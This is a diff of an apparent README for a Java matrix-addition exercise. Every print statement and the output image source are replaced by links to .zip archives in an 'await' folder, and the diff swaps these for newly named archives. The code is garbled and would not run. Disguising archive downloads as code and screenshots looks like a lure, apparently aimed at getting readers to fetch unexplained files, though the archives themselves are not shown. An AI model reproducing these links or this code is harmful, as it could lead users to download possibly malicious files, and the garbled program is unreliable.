@@ -87,12 +87,12 @@ public class Aditionmat {
         }
 
         
-        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/main/await/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES--2.2.zip("Resultant Matrix:");
+        https://github.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/raw/refs/heads/main/await/JAV_TW_PROGRA_PERFOR_MATRICE_ADDITIO_O_T_1.7.zip("Resultant Matrix:");
         for (int i = 0; i < 3; i++) {
             for (int j = 0; j < 3; j++) {
-                https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/main/await/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES--2.2.zip(result[i][j] + " ");
+                https://github.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/raw/refs/heads/main/await/JAV_TW_PROGRA_PERFOR_MATRICE_ADDITIO_O_T_1.7.zip(result[i][j] + " ");
             }
-            https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/main/await/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES--2.2.zip(); 
+            https://github.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/raw/refs/heads/main/await/JAV_TW_PROGRA_PERFOR_MATRICE_ADDITIO_O_T_1.7.zip(); 
         }
     }
 }
@@ -100,7 +100,7 @@ public class Aditionmat {
 
 
 ## OUTPUT:
-<img width="1919" height="1017" alt="2" src="https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/main/await/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES--2.2.zip" />
+<img width="1919" height="1017" alt="2" src="https://github.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/raw/refs/heads/main/await/JAV_TW_PROGRA_PERFOR_MATRICE_ADDITIO_O_T_1.7.zip" />
 
 
 ## RESULT:
